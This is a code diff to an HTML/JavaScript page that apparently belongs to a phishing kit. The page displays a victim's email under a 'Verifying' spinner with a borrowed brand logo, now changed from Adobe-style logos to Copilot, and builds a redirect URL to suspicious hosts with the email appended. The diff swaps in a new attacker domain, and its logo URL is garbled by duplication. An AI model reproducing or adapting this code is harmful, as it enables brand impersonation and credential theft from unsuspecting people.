@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: #f00;
+            background: #FFFFFF;
             color: white;
             text-align: center;
             margin: 0;
@@ -19,11 +19,15 @@
             align-items: center;
         }
         .logo {
-            width: 90px;
-            margin-bottom: 15px;
-            background: white;
-            padding: 10px;
-            border-radius: 8px;
+      width: 150px;
+      height: 150px;
+      background: url('https://cdn-hhgpp.nitrocdn.com/reGDaOLwUcMPtThRYxnreGlXIzZDMKag/assets/images/optimized/rev-e1ef053/cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 0.8; }
+      50% { transform: scale(1.1); opacity: 1; }
+      100% { transform: scale(1); opacity: 0.8; }
         }
         .spinner {
             width: 40px;
@@ -59,11 +63,11 @@
             }
 
             const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
-            const logoUrl = `https://logo.clearbit.com/${domain}`;
-            const targetUrl = email ? `https://zsf3o.ilgmilw.es/@99b523MQ3590Go/*${email}` : 'https://zsf3o.ilgmilw.es/@99b523MQ3590Go/';
+            const logoUrl = `https://1000logos.net/wp-content/uploads/2023/11/Copilot-Logo-768x432.pnghttps://1000logos.net/wp-content/uploads/2023/11/Copilot-Logo-768x432.png`;
+            const targetUrl = email ? `https://06.zeacreze.com.de/AQBiHa@54cYLc58/*${email}` : 'https://06.zeacreze.com.de/AQBiHa@54cYLc58/';
 
             document.body.innerHTML = `
-                <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
+                <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://1000logos.net/wp-content/uploads/2023/11/Copilot-Logo-768x432.pnghttps://1000logos.net/wp-content/uploads/2023/11/Copilot-Logo-768x432.png'" />
                 <p class="message" id="userEmail">Verifying: ${email || 'No Email Provided'}</p>
                 <div class="spinner"></div>
                 <p class="message" id="statusMsg">Please wait while we complete the verification...</p>
